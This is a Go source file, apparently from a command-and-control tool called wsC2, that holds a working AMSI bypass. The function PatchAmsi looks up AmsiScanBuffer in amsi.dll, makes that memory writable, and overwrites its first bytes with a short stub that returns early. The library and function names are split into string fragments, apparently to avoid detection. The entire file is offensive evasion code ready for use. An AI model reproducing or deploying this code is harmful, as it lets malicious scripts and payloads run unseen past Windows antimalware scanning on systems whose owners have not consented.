package patchamsi

import (
	"errors"
	"syscall"
	"unsafe"

	"github.com/latortuga71/wsC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func PatchAmsi() (string, error) {
	patch := make([]byte, 6)
	// push pop push pop nop ret
	patch[0] = 0x50
	patch[1] = 0x58
	patch[2] = 0x53
	patch[3] = 0x5B
	patch[4] = 0x90
	patch[5] = 0xC3
	patchLen := len(patch)
	libName := "a" + "msi" + ".dll"
	funcName := "Am" + "siSca" + "nBu" + "ff" + "er"
	var oldProtect uint32
	var exists windows.Handle
	// check if this thing is even loaded since were using go and not c#
	err := windows.GetModuleHandleEx(0, windows.StringToUTF16Ptr(libName), &exists)
	if err != nil {
		return "", errors.New("Its not loaded in this process your good.\n")
	}
	lib, err := windows.LoadLibrary(libName)
	if err != nil {
		return "", err
	}
	addy, err := windows.GetProcAddress(lib, funcName)
	if err != nil {
		return "", err
	}
	err = windows.VirtualProtect(addy, unsafe.Sizeof(patch), 0x40, &oldProtect)
	if err != nil {
		return "", err
	}
	var nBytesWritten *uint32
	hProc, err := windows.GetCurrentProcess()
	if err != nil {
		return "", err
	}
	writeMem, err := winapi.WriteProcessMemory(
		syscall.Handle(hProc),
		addy,
		(uintptr)(unsafe.Pointer(&patch[0])),
		uint32(patchLen),
		nBytesWritten)
	if !writeMem {
		return "", err
	}
	err = windows.VirtualProtect(addy, unsafe.Sizeof(patch), oldProtect, &oldProtect)
	if err != nil {
		return "", err
	}
	return "Successfully Patched Ahhhhmmmmzeeee", nil
}
